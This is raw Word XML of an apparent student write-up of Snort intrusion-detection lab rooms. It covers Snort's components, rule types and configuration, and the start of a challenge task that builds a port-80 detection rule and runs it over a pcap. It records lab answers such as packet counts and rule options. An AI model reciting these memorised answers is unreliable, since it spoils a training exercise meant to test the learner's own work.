    <w:p w14:paraId="62285998" w14:textId="3817C568" w:rsidR="006B2109" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r w:rsidR="006B2109" w:rsidRPr="006B2109">
        <w:t>216</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C646416" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRPr="006B2109" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="41020E2F" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve">Create a rule to filter packets with the same source and destination IP and run it against the given </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>pcap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve"> file. What is the number of packets that show the same source and destination address?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06E7057B" w14:textId="70E717A0" w:rsidR="006B2109" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r w:rsidR="006B2109" w:rsidRPr="006B2109">
        <w:t>7</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CA08566" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRPr="006B2109" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="67CA0271" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:t>Case Example - An analyst modified an existing rule successfully. Which rule option must the analyst change after the implementation?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BCCA32F" w14:textId="1C7E3DE5" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r w:rsidR="006B2109" w:rsidRPr="006B2109">
        <w:t>rev</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="049D1EC4" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1AB1ECC5" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:lastRenderedPageBreak/>
        <w:t>Task 10: Snort2 Operation Logic: Points to Remember</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36D4F172" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="223F7EE1" w14:textId="39B119F9" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve">Snort consists of several key components. The packet decoder collects and prepares packets for processing. Pre-processors modify packets for the detection engine, which then analyzes them using Snort rules. The logging and alerting </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>component</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00FA6FE2" w:rsidRPr="006B2109">
        <w:t>generate</w:t>
      </w:r>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve"> logs and alerts, while the outputs and plugins handle integrations for outputs like syslog and plugins for rule management.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78F336C1" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="25889316" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:t>There are three types of rules in Snort: Community Rules, which are free and publicly accessible; Registered Rules, which are free but require registration and come with a 30-day update delay; and Subscriber Rules, which are paid and updated twice a week.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="037F67F8" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="49C458AE" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve">To use these rules, you need to specify them in the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>snort.conf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve"> file. It’s important to manually edit this configuration file to avoid errors since it contains essential settings like network variables (HOME_NET, EXTERNAL_NET) and rule paths (RULE_PATH, SO_RULE_PATH).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C8ADEE9" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="46964000" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve">Snort also includes Data Acquisition Modules (DAQ) for packet I/O processing, with modes such as </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>Pcap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve"> (default) and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>Afpacket</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve"> (for IPS mode).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D22120D" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6F1B2C3A" w14:textId="535C2EAA" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve">For efficiency, configure output plugins to control logging and alert formats. Customizing the </w:t>
      </w:r>
      <w:r w:rsidR="00DF508E" w:rsidRPr="006B2109">
        <w:t>rules set</w:t>
      </w:r>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve"> allows you to add site-specific or downloaded rules to </w:t>
      </w:r>
      <w:r w:rsidR="00261C8C" w:rsidRPr="006B2109">
        <w:t>Snort but</w:t>
      </w:r>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve"> remember to uncomment necessary lines in the configuration file.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="007C8D0F" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="453C1FC9" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:t>Task 11: Conclusion</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E9C49B9" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2125CC75" w14:textId="3CC50C22" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:t>In this room, we learned about Snort, its operation, and how to create and use rules to investigate threats. It's important to master the basics before creating advanced rules and options. Avoid making complex rules all at once; add options step by step to easily spot errors. Use existing rules and modify them if needed, instead of creating new ones from scratch. Always back up configuration files before making changes and never delete functional rules. Test new rules before applying them to production environments.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13FF8C72" w14:textId="77777777" w:rsidR="006B2109" w:rsidRDefault="006B2109" w:rsidP="00512FED">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="559C0D33" w14:textId="072A5D41" w:rsidR="00962DBC" w:rsidRPr="00962DBC" w:rsidRDefault="00261C8C" w:rsidP="00962DBC">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Snort Challenge – The Basics</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7829DC5C" w14:textId="78F7B971" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6F9C2A35" w14:textId="5292265A" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Task 1: Introduction</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="550C26CB" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1C388667" w14:textId="578CE870" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>This room contains a challenge that deals with investigating traffic data to stop malicious activity through two different scenarios. Start the Virtual Machine. No answer is required for this task.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F88D757" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7FB9E7BD" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Task 2: Writing IDS Rules (HTTP)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19FC3446" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7B6E2995" w14:textId="1D7D303F" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Using the given </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>pcap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> file for this task, we will write a single </w:t>
      </w:r>
      <w:r w:rsidR="00162076">
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ule to detect all TCP port 80 traffic. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C3E3642" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4F585EF1" w14:textId="0C3F2855" w:rsidR="00670E5C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>First, we will navigate to the correct directory using the terminal.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="692D1BD6" w14:textId="2ECED1EE" w:rsidR="00261C8C" w:rsidRDefault="00670E5C" w:rsidP="00670E5C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="695E2E40" wp14:editId="2EBD4A0E">
            <wp:extent cx="5219700" cy="632460"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="2090478783" name="Picture 3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78783" name="Picture 35" descr="A computer screen shot of a program&#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t="59314" r="4861"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5219700" cy="632460"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D46299C" w14:textId="48ED8BFA" w:rsidR="00670E5C" w:rsidRPr="006B2109" w:rsidRDefault="00670E5C" w:rsidP="00670E5C">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3</w:t>
      </w:r>
      <w:r w:rsidRPr="006B2109">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="404040" w:themeColor="text1" w:themeTint="BF"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="404040" w:themeColor="text1" w:themeTint="BF"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>1: The correct directory for executing commands in Task 2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0291BDBB" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00670E5C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:jc w:val="center"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2C28725F" w14:textId="65597B60" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">We will use the Snort </w:t>
      </w:r>
      <w:r w:rsidR="00670E5C">
        <w:t xml:space="preserve">rule </w:t>
      </w:r>
      <w:r>
        <w:t>structure to create this rule.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26B86C46" w14:textId="4111D30A" w:rsidR="00261C8C" w:rsidRDefault="00670E5C" w:rsidP="00670E5C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="07F4FC01" wp14:editId="550AD284">
            <wp:extent cx="5486400" cy="3550920"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="10473515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p>
    <w:p w14:paraId="131EE9C4" w14:textId="0A67DA44" w:rsidR="00670E5C" w:rsidRPr="006B2109" w:rsidRDefault="00670E5C" w:rsidP="00670E5C">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3.2: A detailed graphical explanation of the Snort rule structure</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D87912C" w14:textId="77777777" w:rsidR="00670E5C" w:rsidRDefault="00670E5C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="34780454" w14:textId="77777777" w:rsidR="00670E5C" w:rsidRDefault="00670E5C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0A556324" w14:textId="3068830B" w:rsidR="00261C8C" w:rsidRDefault="00670E5C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="476209BD" wp14:editId="4177EA69">
            <wp:extent cx="4907280" cy="312420"/>
            <wp:effectExtent l="0" t="0" r="7620" b="0"/>
            <wp:docPr id="17888535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t="44523" r="10431" b="40990"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4907280" cy="312420"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="61CCD79C" w14:textId="6F205E37" w:rsidR="00670E5C" w:rsidRPr="006B2109" w:rsidRDefault="00670E5C" w:rsidP="00670E5C">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3.3:</w:t>
      </w:r>
      <w:r w:rsidR="0066300F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="404040" w:themeColor="text1" w:themeTint="BF"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> The rule that was created for detecting traffic through TCP Port 80</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08C91374" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">*Note: I had to edit the file again because I forgot the colon between </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>sid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> and 1000001*</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D6DF7D2" w14:textId="77777777" w:rsidR="0066300F" w:rsidRDefault="0066300F" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="736D1BAD" w14:textId="65FA6F44" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Run "</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>sudo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> snort -r mx-</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>3.pcap</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> -c </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>local.rules</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> -A full -</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>l .</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t>"</w:t>
      </w:r>
      <w:r w:rsidR="0066300F">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>What is the number of detected packets?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BCBC3EB" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>- 164</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26313C6B" w14:textId="77777777" w:rsidR="0066300F" w:rsidRDefault="0066300F" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7C353A99" w14:textId="54C514B7" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">What is the destination address of packet 63? We </w:t>
      </w:r>
      <w:r w:rsidR="0066300F">
        <w:t>must</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> check the log file. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2115F526" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Use "</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>sudo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> snort -r snort.log.1740002227 -n 63"</w:t>
      </w:r>
    </w:p>
